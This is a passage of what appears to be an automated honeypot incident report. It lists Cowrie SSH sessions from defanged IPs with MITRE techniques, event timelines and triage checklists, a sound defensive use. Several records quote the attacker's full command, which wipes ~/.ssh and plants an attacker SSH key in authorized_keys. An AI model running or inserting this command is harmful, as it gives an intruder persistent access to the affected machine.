| `2026-06-09 07:08:13` | `cowrie.log.closed` |
| `2026-06-09 07:08:14` | `cowrie.session.params` |
| `2026-06-09 07:08:14` | `cowrie.command.input` |
| `2026-06-09 07:08:14` | `cowrie.session.file_download` |
| `2026-06-09 07:08:14` | `cowrie.log.closed` |
| `2026-06-09 07:08:14` | `cowrie.session.params` |
| `2026-06-09 07:08:14` | `cowrie.command.input` |
| `2026-06-09 07:08:15` | `cowrie.log.closed` |
| `2026-06-09 07:08:15` | `cowrie.session.params` |
| `2026-06-09 07:08:15` | `cowrie.command.input` |
| `2026-06-09 07:08:15` | `cowrie.log.closed` |
| `2026-06-09 07:08:16` | `cowrie.session.params` |
| `2026-06-09 07:08:16` | `cowrie.command.input` |
| `2026-06-09 07:08:16` | `cowrie.command.input` |
| `2026-06-09 07:08:16` | `cowrie.log.closed` |
| `2026-06-09 07:08:16` | `cowrie.session.params` |
| `2026-06-09 07:08:16` | `cowrie.command.input` |
| `2026-06-09 07:08:16` | `cowrie.log.closed` |
| `2026-06-09 07:08:16` | `cowrie.session.params` |
| `2026-06-09 07:08:16` | `cowrie.command.input` |
| `2026-06-09 07:08:17` | `cowrie.log.closed` |
| `2026-06-09 07:08:17` | `cowrie.session.params` |
| `2026-06-09 07:08:17` | `cowrie.command.input` |
| `2026-06-09 07:08:17` | `cowrie.log.closed` |
| `2026-06-09 07:08:17` | `cowrie.session.params` |
| `2026-06-09 07:08:17` | `cowrie.command.input` |
| `2026-06-09 07:08:18` | `cowrie.log.closed` |
| `2026-06-09 07:08:18` | `cowrie.session.params` |
| `2026-06-09 07:08:18` | `cowrie.command.input` |
| `2026-06-09 07:08:18` | `cowrie.log.closed` |
| `2026-06-09 07:08:19` | `cowrie.session.params` |
| `2026-06-09 07:08:19` | `cowrie.command.input` |
| `2026-06-09 07:08:19` | `cowrie.log.closed` |
| `2026-06-09 07:08:19` | `cowrie.session.params` |
| `2026-06-09 07:08:19` | `cowrie.command.input` |
| `2026-06-09 07:08:20` | `cowrie.log.closed` |
| `2026-06-09 07:08:20` | `cowrie.session.params` |
| `2026-06-09 07:08:20` | `cowrie.command.input` |
| `2026-06-09 07:08:20` | `cowrie.log.closed` |
| `2026-06-09 07:08:21` | `cowrie.session.params` |
| `2026-06-09 07:08:21` | `cowrie.command.input` |
| `2026-06-09 07:08:21` | `cowrie.log.closed` |
| `2026-06-09 07:08:21` | `cowrie.session.params` |
| `2026-06-09 07:08:21` | `cowrie.command.input` |
| `2026-06-09 07:08:22` | `cowrie.log.closed` |
| `2026-06-09 07:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d268ca6db6

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:09 |
| **Last Seen** | 2026-06-09 07:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:09:40` | `cowrie.session.connect` |
| `2026-06-09 07:09:40` | `cowrie.client.version` |
| `2026-06-09 07:09:41` | `cowrie.client.kex` |
| `2026-06-09 07:09:42` | `cowrie.login.success` |
| `2026-06-09 07:09:42` | `cowrie.session.params` |
| `2026-06-09 07:09:42` | `cowrie.command.input` |
| `2026-06-09 07:09:42` | `cowrie.command.failed` |
| `2026-06-09 07:09:43` | `cowrie.log.closed` |
| `2026-06-09 07:09:43` | `cowrie.session.params` |
| `2026-06-09 07:09:43` | `cowrie.command.input` |
| `2026-06-09 07:09:43` | `cowrie.session.file_download` |
| `2026-06-09 07:09:43` | `cowrie.log.closed` |
| `2026-06-09 07:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e6d9c16186

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:09 |
| **Last Seen** | 2026-06-09 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:09:46` | `cowrie.session.connect` |
| `2026-06-09 07:09:46` | `cowrie.client.version` |
| `2026-06-09 07:09:46` | `cowrie.client.kex` |
| `2026-06-09 07:09:47` | `cowrie.login.success` |
| `2026-06-09 07:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3bb467a7b0

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:13 |
| **Last Seen** | 2026-06-09 07:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:13:09` | `cowrie.session.connect` |
| `2026-06-09 07:13:09` | `cowrie.client.version` |
| `2026-06-09 07:13:09` | `cowrie.client.kex` |
| `2026-06-09 07:13:10` | `cowrie.login.success` |
| `2026-06-09 07:13:11` | `cowrie.session.params` |
| `2026-06-09 07:13:11` | `cowrie.command.input` |
| `2026-06-09 07:13:11` | `cowrie.command.failed` |
| `2026-06-09 07:13:11` | `cowrie.log.closed` |
| `2026-06-09 07:13:11` | `cowrie.session.params` |
| `2026-06-09 07:13:11` | `cowrie.command.input` |
| `2026-06-09 07:13:11` | `cowrie.session.file_download` |
| `2026-06-09 07:13:11` | `cowrie.log.closed` |
| `2026-06-09 07:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ea55bc2580

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:13 |
| **Last Seen** | 2026-06-09 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:13:15` | `cowrie.session.connect` |
| `2026-06-09 07:13:15` | `cowrie.client.version` |
| `2026-06-09 07:13:15` | `cowrie.client.kex` |
| `2026-06-09 07:13:16` | `cowrie.login.success` |
| `2026-06-09 07:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f48c3a983440

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:16 |
| **Last Seen** | 2026-06-09 07:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:16:38` | `cowrie.session.connect` |
| `2026-06-09 07:16:38` | `cowrie.client.version` |
| `2026-06-09 07:16:38` | `cowrie.client.kex` |
| `2026-06-09 07:16:39` | `cowrie.login.success` |
| `2026-06-09 07:16:40` | `cowrie.session.params` |
| `2026-06-09 07:16:40` | `cowrie.command.input` |
| `2026-06-09 07:16:40` | `cowrie.command.failed` |
| `2026-06-09 07:16:40` | `cowrie.log.closed` |
| `2026-06-09 07:16:40` | `cowrie.session.params` |
| `2026-06-09 07:16:40` | `cowrie.command.input` |
| `2026-06-09 07:16:41` | `cowrie.session.file_download` |
| `2026-06-09 07:16:41` | `cowrie.log.closed` |
| `2026-06-09 07:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-385c4d2e1838

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:16 |
| **Last Seen** | 2026-06-09 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:16:44` | `cowrie.session.connect` |
| `2026-06-09 07:16:44` | `cowrie.client.version` |
| `2026-06-09 07:16:44` | `cowrie.client.kex` |
| `2026-06-09 07:16:45` | `cowrie.login.success` |
| `2026-06-09 07:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988a996d5b4f

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:18 |
| **Last Seen** | 2026-06-09 07:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:18:30` | `cowrie.session.connect` |
| `2026-06-09 07:18:30` | `cowrie.client.version` |
| `2026-06-09 07:18:30` | `cowrie.client.kex` |
| `2026-06-09 07:18:31` | `cowrie.login.success` |
| `2026-06-09 07:18:32` | `cowrie.session.params` |
| `2026-06-09 07:18:32` | `cowrie.command.input` |
| `2026-06-09 07:18:32` | `cowrie.command.failed` |
| `2026-06-09 07:18:32` | `cowrie.log.closed` |
| `2026-06-09 07:18:32` | `cowrie.session.params` |
| `2026-06-09 07:18:32` | `cowrie.command.input` |
| `2026-06-09 07:18:33` | `cowrie.session.file_download` |
| `2026-06-09 07:18:33` | `cowrie.log.closed` |
| `2026-06-09 07:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ecc30b43fd

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:18 |
| **Last Seen** | 2026-06-09 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:18:36` | `cowrie.session.connect` |
| `2026-06-09 07:18:36` | `cowrie.client.version` |
| `2026-06-09 07:18:36` | `cowrie.client.kex` |
| `2026-06-09 07:18:37` | `cowrie.login.success` |
| `2026-06-09 07:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1e17314eca

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:23 |
| **Last Seen** | 2026-06-09 07:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:23:56` | `cowrie.session.connect` |
| `2026-06-09 07:23:56` | `cowrie.client.version` |
| `2026-06-09 07:23:57` | `cowrie.client.kex` |
| `2026-06-09 07:23:58` | `cowrie.login.success` |
| `2026-06-09 07:23:58` | `cowrie.session.params` |
| `2026-06-09 07:23:58` | `cowrie.command.input` |
| `2026-06-09 07:23:58` | `cowrie.command.failed` |
| `2026-06-09 07:23:59` | `cowrie.log.closed` |
| `2026-06-09 07:23:59` | `cowrie.session.params` |
| `2026-06-09 07:23:59` | `cowrie.command.input` |
| `2026-06-09 07:23:59` | `cowrie.session.file_download` |
| `2026-06-09 07:23:59` | `cowrie.log.closed` |
| `2026-06-09 07:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40cd6e3d9898

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:24 |
| **Last Seen** | 2026-06-09 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:24:02` | `cowrie.session.connect` |
| `2026-06-09 07:24:02` | `cowrie.client.version` |
| `2026-06-09 07:24:03` | `cowrie.client.kex` |
| `2026-06-09 07:24:04` | `cowrie.login.success` |
| `2026-06-09 07:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8abf876e8ab0

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:27 |
| **Last Seen** | 2026-06-09 07:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:27:27` | `cowrie.session.connect` |
| `2026-06-09 07:27:27` | `cowrie.client.version` |
| `2026-06-09 07:27:28` | `cowrie.client.kex` |
| `2026-06-09 07:27:29` | `cowrie.login.success` |
| `2026-06-09 07:27:29` | `cowrie.session.params` |
| `2026-06-09 07:27:29` | `cowrie.command.input` |
| `2026-06-09 07:27:29` | `cowrie.command.failed` |
| `2026-06-09 07:27:30` | `cowrie.log.closed` |
| `2026-06-09 07:27:30` | `cowrie.session.params` |
| `2026-06-09 07:27:30` | `cowrie.command.input` |
| `2026-06-09 07:27:30` | `cowrie.session.file_download` |
| `2026-06-09 07:27:30` | `cowrie.log.closed` |
| `2026-06-09 07:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-649fcba32961

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:27 |
| **Last Seen** | 2026-06-09 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:27:33` | `cowrie.session.connect` |
| `2026-06-09 07:27:33` | `cowrie.client.version` |
| `2026-06-09 07:27:33` | `cowrie.client.kex` |
| `2026-06-09 07:27:34` | `cowrie.login.success` |
| `2026-06-09 07:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f7512bd9ccb

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:32 |
| **Last Seen** | 2026-06-09 07:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:32:41` | `cowrie.session.connect` |
| `2026-06-09 07:32:41` | `cowrie.client.version` |
| `2026-06-09 07:32:42` | `cowrie.client.kex` |
| `2026-06-09 07:32:43` | `cowrie.login.success` |
| `2026-06-09 07:32:43` | `cowrie.session.params` |
| `2026-06-09 07:32:43` | `cowrie.command.input` |
| `2026-06-09 07:32:43` | `cowrie.command.failed` |
| `2026-06-09 07:32:44` | `cowrie.log.closed` |
| `2026-06-09 07:32:44` | `cowrie.session.params` |
| `2026-06-09 07:32:44` | `cowrie.command.input` |
| `2026-06-09 07:32:44` | `cowrie.session.file_download` |
| `2026-06-09 07:32:44` | `cowrie.log.closed` |
| `2026-06-09 07:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c178616a62

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:32 |
| **Last Seen** | 2026-06-09 07:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:32:47` | `cowrie.session.connect` |
| `2026-06-09 07:32:47` | `cowrie.client.version` |
| `2026-06-09 07:32:47` | `cowrie.client.kex` |
| `2026-06-09 07:32:48` | `cowrie.login.success` |
| `2026-06-09 07:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0922796505bf

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:34 |
| **Last Seen** | 2026-06-09 07:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:34:29` | `cowrie.session.connect` |
| `2026-06-09 07:34:29` | `cowrie.client.version` |
| `2026-06-09 07:34:29` | `cowrie.client.kex` |
| `2026-06-09 07:34:30` | `cowrie.login.success` |
| `2026-06-09 07:34:31` | `cowrie.session.params` |
| `2026-06-09 07:34:31` | `cowrie.command.input` |
| `2026-06-09 07:34:31` | `cowrie.command.failed` |
| `2026-06-09 07:34:31` | `cowrie.log.closed` |
| `2026-06-09 07:34:31` | `cowrie.session.params` |
| `2026-06-09 07:34:31` | `cowrie.command.input` |
| `2026-06-09 07:34:32` | `cowrie.session.file_download` |
| `2026-06-09 07:34:32` | `cowrie.log.closed` |
